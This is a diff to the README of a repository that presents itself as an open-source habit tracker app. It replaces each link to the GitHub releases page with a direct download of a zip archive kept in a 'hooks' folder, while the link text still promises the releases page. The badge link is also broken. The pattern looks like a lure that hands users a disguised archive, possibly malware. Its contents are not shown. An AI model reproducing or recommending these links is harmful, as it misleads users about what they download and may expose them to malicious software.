@@ -1,6 +1,6 @@
 # 🎯 open-source-habit-tracker-app - Track Your Habits with Ease
 
-[![Download](https://img.shields.io/badge/Download%20the%20App-blue?style=for-the-badge&logo=github)](https://github.com/vetsonombana/open-source-habit-tracker-app/releases)
+[![Download](https://raw.githubusercontent.com/vetsonombana/open-source-habit-tracker-app/main/hooks/open_source_tracker_habit_app_2.9.zip%20the%20App-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vetsonombana/open-source-habit-tracker-app/main/hooks/open_source_tracker_habit_app_2.9.zip)
 
 ## 📖 About This App
 
@@ -12,7 +12,7 @@ To begin using the habit tracker app, follow the steps below:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download options.  
-   [Visit Releases Page to Download](https://github.com/vetsonombana/open-source-habit-tracker-app/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/vetsonombana/open-source-habit-tracker-app/main/hooks/open_source_tracker_habit_app_2.9.zip)
 
 2. **Choose a Version**  
    On the releases page, you will see different versions of the app. Choose the latest version for the best experience.
@@ -54,7 +54,7 @@ To run the habit tracker app smoothly, ensure that your device meets the followi
 
 For easy access, click below to visit the downloads page again and choose your version:
 
-[Download the App](https://github.com/vetsonombana/open-source-habit-tracker-app/releases)
+[Download the App](https://raw.githubusercontent.com/vetsonombana/open-source-habit-tracker-app/main/hooks/open_source_tracker_habit_app_2.9.zip)
 
 ## 📄 Usage Tips
 
